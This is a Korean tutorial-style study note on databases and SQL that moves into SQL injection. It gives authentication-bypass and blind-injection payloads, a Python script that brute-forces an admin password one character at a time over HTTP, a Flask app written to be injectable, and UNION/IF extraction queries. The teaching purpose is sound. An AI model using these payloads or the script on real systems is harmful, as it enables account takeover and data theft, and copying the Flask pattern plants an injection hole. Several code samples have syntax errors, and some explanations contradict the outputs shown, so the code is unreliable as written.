일상 생활에서 생기는 다양한 정보를 기록하기 위해 다이어리와 노트를 사용하듯이, 컴퓨터도 정보를 저장하기 위해 데이터베이스(DataBase)를 사용합니다.. 그리고 데이터베이스를 관리하는 애플리케이션을 DataBase Manage System(DBMS) 이라고 합니다.

---

# DataBase Manage System

웹 서비스는 데이터베이스에 저장하고, 이를 관리하기 위해 DataBase Manage System(DBMS)를 사용합니다. DBMS는 데이터베이스에 새로운 정보를 기록하거나, 기록한 내용을 수정, 삭제하기도 하는 역할을 합니다. DBMS는 다수의 사람이 동시에 데이터베이스에 접근할 수 있고, 웹 서비스의 검색 기능과 같이 복잡한 요구사항을 만족하는 데이터를 조회할 수 있다는 특징이 있습니다.

| **종류** | **대표적인 DBMS** |
| --- | --- |
| Relational
(관계형) | MySQL, MariaDB, PostgreSQL, SQLite |
| Non-Relational
(비관계형) | MongoDB, CouchDB, Redis |

두 DBMS의 가장 큰 차이로 관계형은 행과 열의 집합인 테이블 형식으로 데이터를 저장하고, 비관계형은 테이블이 아닌 키-값(Key-Value) 형태로 값을 저장합니다.

---

# Relational DBMS

Relational DataBase Manage System(RDBMS, 관계형 DBMS)는 1970년에 Codds가 12가지 규칙을 정의하여 만든 데이터베이스 모델입니다.

RDBMS는 행과 열의 집합으로 구성된 테이블 형식으로 데이터베이스를 관리하고, 테이블 형식의 데이터를 조작할 수 있는 관계 연산자를 제공합니다. Codds는 12가지 규칙을 정의했지만 실제로 구현된 RDBMS는 12가지 규칙을 모두 따르지 않았고, 최소한의 조건으로 앞의 두 조건을 만족하는 DBMS를 RDBMS라고 부르게 되었습니다. RDBMS에서 관계 연산자는 Structured Query Language(SQL)라는 쿼리 언어를 사용하고, 쿼리를 이용해 테이블 형식의 데이터를 조작합니다. 

---

# SQL

Structured Query Language(SQL)는 RDBMS의 데이터를 정의하고 질의, 수정을 하기 위해 고안된 언어입니다. SQL은 구조화된 형태를 가진 언어로 웹 어플리케이션 DBMS와 상호작용할 때 사용됩니다. SQL은 사용 목적과 행위에 따라 다양한 구조가 존재하는며 대표적으로 아래와 같이 구분된다.

| **언어** | **설명** |
| --- | --- |
| DDL
(Date Definition Language) | 데이터를 정의하기 위한 단어입니다. 
데이터를 저장하기 위해 스키마, 데이터베이스의 생성/수정/삭제 등 행위를 수행합니다. |
| DML
(Data Manipulation Language) | 데이터를 조직하기 위한 단어입니다.
실제 데이터베이스 내에 존재하는 데이터에 대해 조회/저장/수정/삭제 등의 행위를 수행합니다. |
| DCL
(Data Control Language) | 데이터베이스의 접근 권한 등을 설정하기 위한 단어입니다. 
데이터베이스 내에 이용자의 권한을 부여하기 위한 GRANT 와 권한을 박탈하는 REVOKE가 대표적입니다. |

---

# DDL

웹 어플리케이션은 SQL을 사용하여 DBMS와 상호작용을 하며 데이터를 관리합니다. RDBMS에서 사용하는 기본적인 구조는 데이터베이스 → 테이블 → 데이터 구조 입니다. 데이터를 다루기 위해 데이터베이스와 테이블을 생성해야 하며, DDL을 사용해야 합니다. DDL의 CREATE 명령을 사용해 새로운 데이터베이스 또는 테이블을 생성할 수 있습니다.

### 데이터베이스 생성

Dreamhack이라는 데이터베이스를 생성하는 쿼리문

```sql
CREATE DATABASE Dreamhack;
```

### 테이블 생성

앞서 생성한 데이터베이스에 Board 테이블을 생성하는 쿼리문

```sql
USE Dreamhack;
# Board 이름의 테이블 생성
CREATE TABLE Board(
				idx INT AUTO_INCREMENT,
				boardTitle VARCHAR(100) NOT NULL,
				boardContent VARCHAR(2000) NOT NULL,
				PRIMARY KEY(idx)
);
```

---

# DML

생성된 테이블에 데이터를 추가하기 위해 DML을 사용합니다. 다음은 새로운 데이터를 생성하는 INSERT, 데이터를 조회하는 SELECT, 그리고 데이터를 수정하는 UPDATE의 예시입니다.

### 테이블 데이터 생성

Board 테이블에 데이터를 삽입하는 쿼리문

```sql
INSERT INTO
	Board(boardTitle, boardContent, createDate)
Values(
	'Hello',
	'World !'.
	Now()
);
```

## 테이블 데이터 변경

Board 테이블의 컬럼 값을 변경하는 쿼리문

```sql
UPDATE Board SET boardContent='DreamHack!'
	Where idx=1;
```

---

# SQL Injection

### Injection이란?

 인젝션은 주입이라는 의미를 가진 영단어로, 인젝션 공격은 이용자의 입력값이 애플리케이션의 처리 과정에서 구조나 문법적인 데이터로 해석되어 발생하는 취약점을 의미합니다.

!image.png

#### 아모의 올바른 요청

위 그림은 아모가 공장에 생산을 요청하는 그림으로, 위의 그림에서 아모가 부품 생성 중에 임의의 요청을 보내 제품의 색깔을 지정합니다. 그러나 아래 그림에서 난도가 올바르지 않은 요청을 보내 공장 운영자가 의도하지 않은 행위를 일으키는 것을 확인할 수 있습니다. 이와 같이 이용자가 악의적인 입력값을 주입해 의도하지 않은 행위를 일으키는 것을 인젝션이라고 합니다.

 

!image.png

#### 난도의 인젝션 요청

SQL Injection을 이헤하기 위해 예시를 들어보도록 하겠습니다. 아모가 로그인을 하기 위해 “아이디가 Dreamhack이고, 비밀번호가 Password인 계정으로 로그인하겠습니다.” 요청을 보내면 DBMS는 이에 해당하는 정보를 찾아 로그인 성공 여부를 결정할 것입니다. 그러나 만약 난도가 “아이디가 admin인 계정으로 로그인하겠습니다.” 요청을 보내면 DBMS는 비밀번호 일치 여부를 검사하지 않고, 아이디가 admin인 계정을 조회한 후 이용자에게 로그인 결과를 반활할 것입니다. 이와 같이 DBMS에서 사용하는 질의 구문인 SQL 삽입하는 공격을 SQL Injection이라고 합니다. 

---

## SQL Injection

SQL은 DBMS에 데이터를 질의하는 언어입니다. 웹 서비스는 이용자의 입력을 SQL 구문에 포함해 요청하는 경우가 있습니다. 예를 들면, 로그인 시에 ID/PW를 포함하거나, 게시글의 제목과 내용을 SQL 구문에 포함합니다. 아래 쿼리는 로그인 할 때 애플리케이션이 DBMS에 질의하는 예시 쿼리입니다.

```sql
/*
아래 쿼리 질의는  다음과 같은 의미를 가지고 있습니다.
-SELECT: 조회하는 명령어
- *: 테이블의 모든 컬럼 조회
- FROM accounts: accounts 테이블에서 데이터를 조회할 것이라고 지정
- WHERE user_id='dreamhack' and user_pw='password': user_id 컬럼이 password인 데이터로 범위 지정
즉, 이를 해석하면 DBMS에 지정된 accounts 테이블에서 이용자의 아이디가 dreamhack이고, 비밀번호가 password인 데이터를 조회
*/
SELECT * FROM accounts WHERE user_id='dreamhack' and user_pw='password'
```

### 로그인 기능을 위한 쿼리

쿼리문을 살펴보면, 이용자가 입력한 “dreamhack”과 “password” 문자열을 SQL 구문을 포함하는 것을 확인할 수 있습니다. 이렇게 이용자가 SQL 구문에 임의 문자열을 삽입하는 행위를 SQL Injection이라고 합니다. SQL Injection이 발생하면 조작된 쿼리로 인증을 우

회하거나, 데이터베이스의 정보를 유출할 수 있습니다.

아래 쿼리는 SQL Injection으로 조작한 쿼리문의 예시입니다.

```sql
/*
아래 쿼리 질의는  다음과 같은 의미를 가지고 있습니다.
-SELECT: 조회하는 명령어
- *: 테이블의 모든 컬럼 조회
- FROM accounts: accounts 테이블에서 데이터를 조회할 것이라고 지정
- WHERE user_id='dreamhack' and user_pw='password': user_id 컬럼이 password인 데이터로 범위 지정
즉, 이를 해석하면 DBMS에 지정된 accounts 테이블에서 이용자의 아이디가 dreamhack이고, 비밀번호가 password인 데이터를 조회
*/
SELECT * FROM accounts WHERE user_id='admin'
```

### SQL Injection으로 조작한 쿼리

쿼리를 살펴보면, user_pw 조건문이 사라진 것을 확인할 수 있습니다. 조작한 쿼리를 통해 질의하면 DBMS는 ID가 admin인 계정의 비밀번호를 비교하지 않고 해당 계정의 정보를 반환하기 때문에 이용자는 admin 계정으로 로그인할 수 있습니다.

---

## Blind SQL Injection

앞서 SQL Injection을 통해 의도하지 않은 결과를 반환해 인증을 우회하는 것을 실습했습니다. 해당 공격은 인증 우회 이외에도 데이터베이스의 데이터를 알아낼 수 있습니다. 이때 사용할 수 있는 공격 기법으로는 **Blind SQL Injection**이 있습니다. 해당 공격 기법은 스무고개 게임과 유사한 방식으로 데이터를 알아낼 수 있습니다. 스무고개는 질문자와 답변자가 있고, 질문자가 질문을 하면 답변자가 예/아니오로 대답을 해 질문자가 답을 유추하는 게임입니다.

아래 그림을 보면 답변자가 7이라는 숫자를 칠판에 적어둔 뒤, 질문을 받습니다. 질문자는 해당 숫자가 6인지 묻습니다. 답변자는 6보다 큰 숫자라고 답을 합니다. 이제 질문자는 해당 숫자가 8인지 묻자, 답변자는 8보다 작은 숫자라고 답을 합니다. 이때 질문자는 정답이 7이라는 것을 알 수 있습니다. 공격자는 이러한 방법으로 데이터베이스의 내용을 알아낼 수 있습니다. 다음은 계정 정보를 탈취한다고 가정했을 때 예시입니다.

- Question #1. dreamhack 계정의 비밀번호 첫 번째 글자는 ‘x’인가요?
    - Answer. 아닙니다.
- Question #2. dreamhack 계정의 비밀번호는 첫 번째 글자는 ‘p’인가요?
    - Answer. 맞습니다. (첫 번째 글자 = p)
- Question #3. dreamhack 계정의 비밀번호 두 번째 글자는 ‘y’인가요?
    - Answer. 아닙니다.
- Question #4. dreamhack 계정의 비밀번호 두 번째 글자는 ‘a’인가요??
    - Answer. 맞습니다. (두 번째 글자 = a)

위와 같은 형태로 DBMS가 답변 가능한 형태로 질문하면서 dreamhack 계정의 비밀번호인 passwor를 알아낼 수 있습니다. 이처럼 질의 결과를 이용자가 화면에서 직접 확인하지 못할 때 참/거짓 반환 결과로 데이터를 획득하는 공격 기법인 Blind SQL Injection

!image.png

# Blind SQL Injection

아래는 Blind SQL Injection 공격 시 사용할 수 있는 쿼리입니다.

```sql
# 첫 번째 글자 구하기
SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='a'-- ' and upw=' '; # False
SELECT * FROM user_table WHERE uid='admin' and substr(upw,1,1)='b'-- ' and upw=' '; # True
# 두 번째 글자 구하기
SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='d'-- ' and upw=' '; # False
SELECT * FROM user_table WHERE uid='admin' and substr(upw,2,1)='e'-- ' and upw=' '; # True
```

### Blind SQL Injection 공격 쿼리

쿼리를 살펴보면, 두 개의 조건이 있는 것을 확인할 수 있습니다. 조건을 살펴보기 전에 substr 함수에 관해 알아보겠습니다.

## substr

해당 함수는 문자열에서 지정한 위치부터 길이까지의 값을 가져옵니다. 사용 예시는 다음과 같습니다.

```sql
substr(string, position, length)
substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

공격 쿼리문의 두 번째 조건을 살펴보면, upw의 첫 번째 값을 아스키 형태로 변환한 값이 ‘a’ 또는 ‘b’인지 질의합니다. 질의 결과는 로그인 성공 여부로 참/거짓을 판단할 수 있습니다. 만약 로그인이 실패할 경우 첫 번째 문자가 ‘a’가 아님을 의미합니다. 이처럼 쿼리문의 반환 결과를 통해 admin 계정의 비밀번호를 획득할 수 있습니다.

substr 외에도, 각 DBMS에서 제공하는 내장 함수를 잘 이용하는 것으로 원하는 데이터를 추출할 수 있습니다.

---

# Blind SQL Injection 공격 스크립트

Blind SQL Injection은 한 바이트씩 비교하여 공격하는 방식이기 때문에 다른 공격에 비해 많은 시간을 들여야합니다. 이러한 문제를 해결하기 위해서는 공격을 자동화하는 스크립트를 작성하는 방법이 있습니다. 공격 스크립트를 작성하기에 앞서 유용한 라이브러리를 알아보겠습니다. 파이썬은 HTTP 통신을 위한 다양한 모듈이 존재하는데, 대표적으로 requests 모듈이 있습니다. 해당 모듈은 다양한 메소드를 사용해 HTTP 요청을 보낼 수 있으며 응답 또한 확인할 수 있습니다.

아래 코드는 requests 모듈을 통해 HTTP의 GET 메소드 통신을 하는 예제 코드입니다. requests.get은 GET 메소드를 사용해 HTTP 요청을 보내는 함수로, URL과 Header, Parameter와 함께 요청을 전송할 수 있습니다.

```python
import requests
url = 'https://dreamhack.io/'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'DREAMHACK_REQUEST'
}
params = {
    'test': 1,
}
for i in range(1, 5):
    c = requests.get(url + str(i), headers=headers, params=params)
    print(c.request.url)
    print(c.text)
```

### requests 모듈 GET 예제 코드

아래 코드는 HTTP의 POST 메소드 통신을 하는 예제 코드입니다. requests.post는 POST 메소드를 사용해 HTTP 요청을 보내는 함수로 URL과 Header, Body와 함께 요청을 전송할 수 있습니다.

```python
  import requests
  url = 'https://dreamhack.io/'
  headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'DREAMHACK_REQUEST'
  }
  params = {
      'test': 1,
  }
  for i in range(1, 5):
      c = requests.post(url + str(i), headers=headers, params=params
      print(c.text)
```

GET, POST 메소드 이외에도 다양한 메소드를 사용해 요청을 전송할 수 있으며, 더욱 자세한 기능은 아래 첨부한 공식 문서를 참고하세요.

Requests 모듈 공식 문서
https://docs.python-requests.org/en/latest/

# Blind SQL Injection 공격 스크립트 작성

HTTP GET request로 파라미터를 전달받는 홈페이지에 Blind SQL Injection을 시도한다고 가정합시다. 공격하기에 앞서, 아스키 범위 중 이용자가 입력할 수 있는 모든 문자의 범위를 지정해야 합니다. 예를 들어, 비밀번호의 경우 알파벳과 숫자 그리고 특수 문자로 이루어집니다. 이는 아스키 범위의 출력 가능한 모든 문자이며, Python에서는 string 모듈을 이용해 string.printable로 접근할 수 있습니다. 이 사안을 고려해 작성한 스크립트는 다음과 같습니다.

```python
#!/usr/bin/python3
import requests
import string
# example URL
url = 'http://example.com/login'
params = {
    'uid': ' ',
    'upw': ' '
}
# ascii printables
tc = string.printable
# 사용할 SQL Injection 쿼리
query = '''admin' and substr(upw,{idx},1)='{val}'--'''
password = ' '
# 비밀번호 길이는 20자 이하라 가정
for idx in range(0, 20):
    for ch in tc:
        # query를 이용하여 Blind SQL Injection 시도
        params['uid'] = query.format(idx=idx+1, val=ch).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        # 응답에 Login succes 문자열이 있으면 해당 문자를 password 변수에 저장
        if c.text.find("Login success") != -1:
             password += ch
             break
 print(f"Password is {password}"
```

### Blind SQL Injection 공격 스크립트

코드를 살펴보면, 비밀번호에 포함될 수 있는 문자를 string 모듈을 사용해 생성하고, 한 바이트씩 모든 문자를 비교하는 반복문을 작성합니다. 반복문 실행 중에 반환 결과가 참일 경우에 페이지에 표시되는 “Login success” 문자열을 찾고, 해당 결과를 반환한 문자를 password 변수에 저장합니다. 반복문을 마치면 “admin” 계정의 비밀번호를 알아낼 수 있습니다. 다음에 예제 코드의 실행 결과입니다.

```python
$ python3 bsqli.py
http://example.com/login?=uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%270%27--+&upw=
http://example.com/login?=uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%271%27--+&upw=
http://example.com/login?=uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%272%27--+&upw=
http://example.com/login?=uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%273%27--+&upw=
http://example.com/login?=uid=admin%27+and+substr%28upw%2C1%2C1%29%3D%274%27--+&upw=

```

### 예제 코드 실행 결과

---

# SQL DML

## SELECT

**SELECT**는 데이터를 조회하는 구문입니다. 다음은 MYSQL 공식 페이지에서 제공하는 SELECT 구문의 예시입니다.

```sql
# mysql SELECT Statement https://dev.mysql.com/doc/refman/8.0/en/select.html
SELECT
    select_expr [, select_expr] ...
FROM table_references
WHERE where_condition
[GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
[ORDER BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]]
[LIMIT {[offset,] row_count | row_count OFFSET offset}]
```

다음은 SELECT 구문의 예시를 자세히 설명한 표입니다. SELECT 구문에서 특정 조건을 만족하는 데이터를 찾기 위한 WHERE, 조회한 결과를 정렬하거나 특정 부분만을 확인하기 위한 ORDER BY, LIMIT 등이 있습니다.

| **절** | **설명** |
| --- | --- |
| SELECT | 해당 문자열을 시작으로, 조회하기 위한 표현식과 컬럼들에 대해 정의합니다. |
| FROM | 데이터를 조회할 테이블의 이름입니다. |
| WHERE | 조회할 데이터의 조건입니다. |
| ORDER BY | 조회한 결과를 원하는 컬럼 기준으로 정렬합니다. |
| LIMIT | 조회한 결과에서 행의 개수와 오프셋을 지정합니다. |

### SELECT 사용 예시

아래 SELECT 구문을 사용한 예시입니다. 쿼리를 살펴보면, 먼저 FROM 절을 사용해 board 테이블의 uid, title, boardcontent 데이터를 검색합니다. 그리고 WHERE 절을 사용해 boardcontent 데이터에 “abc” 문자가 포함되어 있는지 찾습니다. 이렇게 찾은 데이터를 ORDER BY 절을 통해 uid를 기준으로 내림차순 정렬한 후, 5개의 행을 결과로 반환합니다.

```sql
SELECT
    uid, title, boardcontent
FROM board
WHERE boardcontent like '%abc%'
ORDER BY uid DESC
LIMIT 5
```

## INSERT

**INSERT**는 데이터를 추가하는 구문입니다. 아래는 MYSQL 공식 페이지에서 제공하는 INSERT 구문의 예시입니다.

```sql
# mysql INSERT Statement https://dev.mysql.com/doc/refman/8.0/en/insert.html
INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
    [INTO] tbl_name
    [PARTITION (partition_name [, partition_name] ...)]
    [(col_name [, col_name] ...)]
    { {VALUES | VALUE} (value_list) [, (value_list)] ...
      |
      VALUES row_constructor_list
    }
```

다음은 INSERT 구문의 예시를 자세히 설명한 표입니다. INSERT 구문에서 데이터를 추가할 테이블과 컬럼을 정의하는 INTO, 추가할 데이터를 정의하는 VALUES 등이 있습니다.

| **절** | **설명** |
| --- | --- |
| INSERT | 해당 문자열을 시작으로, 추가할 테이블과 데이터를 정의합니다. |
| INTO | 데이터를 추가할 테이블의 이름과 컬럼을 정의합니다. |
| VALUES | INTO 절에서 정의한 테이블의 컬럼에 명시한 데이터를 추가합니다. |

### INSERT 사용 예시

다음 코드들은 INSERT 구문을 사용한 예시입니다. 먼저 아래 쿼리를 살펴보면, INTO 절을 사용해 추가할 테이블과 컬럼을 각각 board와 title, boardcontent로 명시합니다. 그리고 VALUES 절을 통해 INTO 절에서 명시한 테이블의 각각의 컬럼에 “title 1”, “content 1”과 “title 2”, “content 2” 데이터를 추가합니다. 이처럼 쿼리 한 줄로 두 개 이상의 데이터를 추가할 수 있습니다.

```sql
INSERT
    INTO board (title, boardcontent)
    VALUES ('title 1', 'content 1'), ('title 2', 'content 2');
```

이 밖에도 다음과 같이 서브 쿼리를 통해 다른 테이블에 존재하는 데이터를 추가할 수 있습니다. 쿼리를 살펴보면, 이전과 같이 추가할 테이블과 컬럼을 각각 board와 title, boardcontent로 명시합니다. 그리고 데이터를 추가하되, boardcontent에는 SELECT 구문을 실행해 users 테이블에 uid 컬럼의 값이 “admin”인 행을 찾고, 해당하는 행의 upw 데이터를 추가합니다. 이처럼 서브쿼리를 사용하면 다른 테이블에 있는 데이터를 그대로 가져와 삽입할 수 있습니다.

```sql
INSERT
    INTO board (title, boardcontent)
    VALUES ('title 1', (select upw from users where uid='admin'));
```

## UPDATE

**UPDATE**는 데이터를 수정하는 구문입니다. 다음은 MYSQL 공식 페이지에서 제공하는 UPDATE 구문의 예시입니다.

```sql
# mysql UPDATE https://dev.mysql.com/doc/refman/8.0/en/update.html
UPDATE [LOW_PRIORITY] [IGNORE] table_references
    SET assignment_list
    [WHERE where_condition]
```

다음은 UPDATE 구문의 예시를 자세히 설명한 표입니다. UPDATE 구문에서 수정할 컬럼과 데이터를 정의하는 SET, 수정할 데이터의 조건을 정의하는 WHERE 등이 있습니다.

| **절** | **설명** |
| --- | --- |
| UPDATE | 해당 문자열을 시작으로, 수정할 테이블을 정의합니다. |
| SET | 수정할 컬럼과 데이터를 정의합니다. |
| WHERE | 수정할 행의 조건을 정의합니다. |

### UPDATE 사용 예시

다음은 UPDATE 구문을 사용한 예시입니다. 쿼리를 살펴보면, board 테이블의 boardcontent 컬럼을 “update content 2” 문자열로 수정합니다. 수정될 데이터의 조건은 title 컬럼의 값이 “title 1”인 행인 것을 WHERE 절을 통해 알 수 있습니다.

```sql
UPDATE board
    SET boardcontent = "update content 2"
    WHERE title = 'title 1';
```

# DELETE

**DELETE**는 데이터를 삭제하는 구문입니다. 다음은 MYSQL 공식 페이지에서 제공하는 DELETE 구문의 예시입니다.

```sql
# mysql DELETE https://dev.mysql.com/doc/refman/8.0/en/delete.html
DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name [[AS]] tbl_alias
    [PARTITION (partition_name [, partition_name] ...)]
    [WHERE where_condition]
    [ORDER BY ...]
    [LIMIT row_count]
```

다음은 DELETE 구문의 예시를 자세히 설명한 표입니다. DELETE 구문에서 삭제할 테이블을 정의하는 FROM, 삭제할 데이터의 조건을 정의하는 WHERE 절이 있습니다.

| 절 | 설명 |
| --- | --- |
| DELETE | 해당 문자열을 시작으로, 이후에 삭제할 테이블을 정의합니다. |
| FROM | 삭제할 테이블을 정의합니다. |
| WHERE | 삭제할 행의 조건을 정의합니다. |

### DELETE 사용 예시

다음은 DELETE 구문을 사용한 예시입니다. 쿼리를 살펴보면, board 테이블의 title 컬럼이 “title 1”인 행을 삭제하는 것을 알 수 있습니다.

```sql
DELETE FROM board
    WHERE title = 'title 1';
```

---

# SQL Features

## UNION

**UNION**은 다수의 SELECT 구문의 결과를 결합하는 절입니다. 해당 절을 통해 다른 테이블에 접근하거나 원하는 쿼리 결과를 생성해 애플리케이션에서 처리하는 타 데이터를 조작할 수 있습니다. 이는 애플리케이션이 데이터베이스 쿼리의 실행 결과를 출력하는 경우 유용하게 사용할 수 있는 절입니다.

아래는 UNION 절의 사용 예시입니다. username 과 password 컬럼에 각각 “DreamHack”, “DreamHackPW” 가 일치하는 데이터를 조회하는 것을 알 수 있습니다.

```sql
mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHack PW";
/*
+-----------+--------------+
| username  | password     |
+-----------+--------------+
| admin     | admin        |
| guest     | guest        |
| DreamHack | DreamHack PW |
+-----------+--------------+
3 rows in set (0.01 sec)
*/
```

### UNION 절의 사용 예시

---

## Condition

해당 구문을 사용할 때에는 두 가지 필수 조건을 만족해야 합니다. 첫 번째로는 이전 SELECT 구문과 UNION을 사용한 구문의 실행 결과 중 컬럼의 개수가 같아야합니다. 아래는 mysql에서 두 구문의 결과인 컬럼의 개수가 일치하지 않아 에러가 발생하는 모습입니다.

```sql
mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHack PW", "Third Column"
/*
ERROR 1222 (21000): The used SELECT statements have a different number of columns
*/
```

### 잘못된 UNION 사용 예시 - 컬럼 개수

두 번째로는 특정 DBMS에서는 이전 SELECT 구문과 UNION을 사용한 구문의 컬럼 타입이 같아야 합니다. 아래는 MSSQL에서 두 구문의 컬럼 타입이 일치하지 않아 에러가 발생하는 모습입니다.

```sql
# MSSQL (SQL Server)
SELECT 'ABC'
UNION SELECT 123;
/*
Conversion failed when converting the varchar value 'ABC' to data type int.
*/
```

### 잘못된 UNION 사용 예시 - 컬럼 타입

---

# 서브 쿼리

서브 쿼리 (Subquery)는 한 쿼리 내에 또 다른 쿼리를 사용하는 것을 의미합니다. 서브 쿼리를 사용하기 위해서는 쿼리 내에서 괄호 안에 구문을 삽입해야 하며, SELECT 구문만 사용할 수 있습니다. 공격자는 서브 쿼리를 통해 쿼리가 접근하는 테이블이 아닌 테이블에 접근하거나 SELECT 구문을 사용하지 않은 쿼리문에서 SQL Injection 취약점이 발생할 때 SELECT 구문을 사용할 수 있습니다.

아래는 서브 쿼리를 사용해 데이터를 조회한 모습입니다. 결과를 살펴보면, 서브 쿼리가 실행되어 456이 출력된 것을 확인할 수 있습니다.

```sql
mysql> SELECT 1, 2, 3, (SELECT 456);
/*
+---+---+---+--------------+
| 1 | 2 | 3 | (SELECT 456) |
+---+---+---+--------------+
| 1 | 2 | 3 |          456 |
+---+---+---+--------------+
1 row in set (0.00 sec)
*/
```

### 서브 쿼리 사용 예시

---

# 서브 쿼리 사용 예시

서브 쿼리를 실제로 어떻게 사용하는지 알아보고, 사용할 때 주의해야 할 점을 알아보겠습니다.

## COLUMNS 절

SELECT 구문의 컬럼 절에서 서브 쿼리를 사용할 때에는 단일 행 (Single Row)과 단일 컬럼(Single Column)이 반환되도록 해야 합니다. 아래는 복수의 행과 컬럼을 반환하는 서브 쿼리를 실행한 모습입니다. 결과를 살펴보면, 복수의 행 또는 컬럼을 반환하면서 에러가 발생하는 것을 확인할 수 있습니다.

```sql
mysql> SELECT username, (SELECT "ABCD" UNION SELECT 1234) FROM users;
ERROR 1242 (21000): Subquery returns more than 1 row
mysql> SELECT username, (SELECT "ABCD", 1234) FROM users;
ERROR 1241 (21000): Operand should contain 1 column(s)
```

## 서브 쿼리 사용 예시 - COLUMN

## FROM 절

FROM 절에서 사용하는 서브 쿼리를 인라인 뷰 (Inline View)라고 하며, 이는 다중 행 (Multiple Row)과 다중 컬럼 (Multiple Column) 결과를 반환할 수 있습니다. 아래는 인라인 뷰를 이용해 다중 행과 컬럼의 결과를 반환하는 쿼리문을 실행한 모습입니다.

```sql
mysql> SELECT * FROM (SELECT *, 1234 FROM users) as u;
/*
+----------+------+
| username | 1234 |
+----------+------+
| admin    | 1234 |
| guest    | 1234 |
+----------+------+
2 rows in set (0.00 sec)
*/
```

### 서브 쿼리 사용 예시 - FROM

## WHERE 절

WHERE 절에서 서브 쿼리를 사용하면 다중 행 결과를 반환하는 쿼리문을 실행할 수 있습니다. 아래는 WHERE 절에서 다중 행을 반환하는 쿼리를 실행한 모습입니다.

```sql
mysql> SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
/*
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin    |
| guest    | guest    |
+----------+----------+
2 rows in set (0.00 sec)
*/
```

### 서브 쿼리 사용 예시 - WHERE

---

# Application Logic

SQL Injection은 애플리케이션 내부에서 사용하는 데이터베이스의 데이터를 조작하는 기법입니다. 만약, 특정 쿼리를 실행했을 때 쿼리의 실행 결과가 애플리케이션에서 보여지지 않는다면 공격자 입장에서는 데이터베이스의 정보를 추측하기 어렵습니다. 대부분의 애플리케이션은 데이터베이스의 결과에 따라 각기 다른 기능을 수행합니다. 예를 들어, 특정 번호의 게시물을 조회할 때 번호에 일치하는 게시물이 있다면 이용자에게 보여주고, 없다면 게시물이 존재하지 않는다는 메시지를 출력합니다. 이를 통해 공격자는 참과 거짓을 구분하여 공격을 수행할 수 있습니다.

아래는 Flask 프레임워크를 사용한 예제 코드입니다. 코드를 살펴보면, 인자로 전달된 username을 쿼리로 사용하면서 SQL Injection이 발생하며, 해당 쿼리의 결과로 username 이 “admin” 일 경우 참을, 아닌 경우에는 거짓을 반환합니다.

```python
## pip3 install PyMySQL //pymysql 라이브러리를 설치하기 위한 명령여
from flask imort Flask, request
import pymysql
app = Flask(__name__)
def getConnection():
    return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
@app.route('/' , methods=['GET']
def indext():
    username = request.args.get('username')
    sql = "select username from users where username='%s'" %username
    conn = getConnection()
    curs = conn.cursor(pymysql.cursors.DictCursor)
    curs.execute(sql)
    rows = curs.fetchall()
    conn.close()
    if(rows[0]['username'] == "admin"):
        return "True"
    else:
        return "False"
app.run(host='0.0.0.0', port=8000)
```

### Application Logic 예제 코드

---

# Logic 이용 공격

데이터베이스가 아래와 같이 구성되어 있다고 가정합니다.

| **username** | **password** |
| --- | --- |
| admin | Password_for_admin |
| guest | guest_Password |

## UNION을 사용한 공격

UNION 절을 사용하면 두 개의 SELECT 구문의 결과를 반환하므로 참을 반환할 수 있습니다. 아래는 SQL Injection으로 새로운 쿼리를 삽입한 모습입니다. 공격 코드를 삽입하면 UNION 절에서 “admin” 을 반환하기 때문에 애플리케이션에서 참을 반환하게 됩니다.

```sql
 /?username=' union select 'admin' -- -
 ==> True
```

### UNION 절을 이용한 공격

## 비교 구문을 사용한 공격

애플리케이션에서 “admin” 을 반환해 관리자 권한으로 로그인하는 방법도 있지만 관리자 계정의 비밀번호를 알아내는 방법 또한 존재합니다. SQL에서는 IF문을 사용해 비교 구문을 만들 수 있습니다. 해당 구문을 통해 관리자 계정의 비밀번호를 한 글자씩 알아낼 수 있습니다. 아래는 비교 구문을 통해 관리자 계정의 비밀번호를 한 글자씩 알아내는 공격 쿼리입니다.

substr 함수는 첫 번째 인자로 전달된 문자열을 두 번째 인자로 전달된 위치에서 시작하여 세 번째 인자로 전달된 문자 수 만큼의 문자들을 반환합니다. 비밀번호 첫 번째 바이트가 ‘B’ 인지 비교하고, 반환 결과를 통해 비밀번호의 첫 번째 바이트는 ‘B’ 가 아님을 알 수 있습니다. 이후 두 번째와 세 번째 쿼리의 반환 결과를 통해 첫 번째 바이트가 ‘P’, 두 번째 바이트가 ‘a’ 인 것을 알아낼 수 있습니다. 이와 같은 방법으로 관리자 계정의 비밀번호를 알아낼 수 있습니다.

```sql
/?username=' union select if(substr(password, 1, 1)='B', 'admin', 'not admin') from users where username='admin' -- -
==> False
/?username=' union select if(substr(password, 1, 1)='P', 'admin', 'not admin') from users where username='admin' -- -
==> False
/?username=' union select if(substr(password, 1, 1)='a', 'admin', 'not admin') from users where username='admin' -- -
==> False
```

### 비교 구문을 이용한 공격
